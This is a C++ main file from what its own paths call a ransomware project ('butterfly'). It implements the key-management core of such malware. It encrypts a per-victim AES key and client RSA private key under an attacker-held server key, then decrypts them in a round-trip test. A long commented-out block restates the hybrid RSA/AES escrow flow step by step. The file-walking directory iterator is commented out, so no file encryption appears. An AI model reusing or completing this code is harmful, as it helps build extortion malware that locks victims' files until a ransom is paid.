
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"

int main(int argc, char* argv[]) {

    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application "<< PROJECT_NAME << " with version " << arg._version);
    //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());

    std::unique_ptr<butterfly::Encryptor> encryptor(new butterfly::Encryptor());
    encryptor->encryptAESKey();
    encryptor->encryptCPrivateRSA();

    sleep(2);

    std::unique_ptr<butterfly::Decryptor> decryptor(new butterfly::Decryptor());
    std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem");
    decryptor->decryptAESKey(cprivate);

    /*
    std::unique_ptr<butterfly::RSAEncryptor> rsaEncryptor(new butterfly::RSAEncryptor(2048));

    rsaEncryptor->saveClientPrivateRSAKeyFile();

    // 1. encrypt aes key
    std::string aesKey = "0123456789abcdefghijklabcd";
    if ( rsaEncryptor->encrypt(rsaEncryptor->getEvpPkey(), aesKey) ) {
        std::string aesKeyEnc = rsaEncryptor->getEncryptedKey();
        rsaEncryptor->saveEncryptedKeyFile("AESKey.bin", aesKeyEnc, rsaEncryptor->getRSAKeySize());
    }

    std::string cPrivateRSA = rsaEncryptor->getRSAPrivateKeyStr();

    std::unique_ptr<butterfly::RSAEncryptor> rsaEncryptorFile(new butterfly::RSAEncryptor("/home/christian/projects/ransomware/masterkeys/SPublic.pem"));
    EVP_PKEY *pkey1 = rsaEncryptorFile->getEvpPkey();

    if ( rsaEncryptorFile->encrypt(pkey1, cPrivateRSA.substr(0, cPrivateRSA.size()-1)) ) {
        std::string cPrivateRSAEnc = rsaEncryptorFile->getEncryptedKey();
        rsaEncryptorFile->saveEncryptedKeyFile("CPrivateRSA.bin", cPrivateRSAEnc, rsaEncryptorFile->getEvpPkeySize(pkey1));
    }


    sleep(2);


    std::unique_ptr<butterfly::RSADecryptor> rsaDecryptorCPrivateRSA(new butterfly::RSADecryptor("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem"));

    std::string encCPrivateRSA = rsaDecryptorCPrivateRSA->getBinKeyFileContents("CPrivateRSA.bin");
    EVP_PKEY *pkey = rsaDecryptorCPrivateRSA->getEvpPkey();
    //EVP_PKEY *pkey = rsaDecryptorCPrivateRSA->getPkeyFromPrivateKeyFile("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem");
    std::string decCPrivateRSA;
    if (rsaDecryptorCPrivateRSA->decrypt(pkey, encCPrivateRSA)) {
        decCPrivateRSA = rsaDecryptorCPrivateRSA->getDecryptedKey();
        LOG_TRACE("decryptedCPrivateRSA: " << decCPrivateRSA)
    }

    std::unique_ptr<butterfly::RSADecryptor> rsaDecryptorAES(new butterfly::RSADecryptor(decCPrivateRSA));

    std::string encAESKey = rsaDecryptorAES->getBinKeyFileContents("AESKey.bin");
    //EVP_PKEY *pkey = rsaDecryptorAES->getEvpPkeyFromFile("CPrivateRSA.pem");
    EVP_PKEY *pkey1 = rsaDecryptorAES->getEvpPkey();
    if (rsaDecryptorAES->decrypt(pkey1, encAESKey) ) {
        LOG_TRACE(rsaDecryptorAES->getDecryptedKey())
    }
    */

    return 0;
}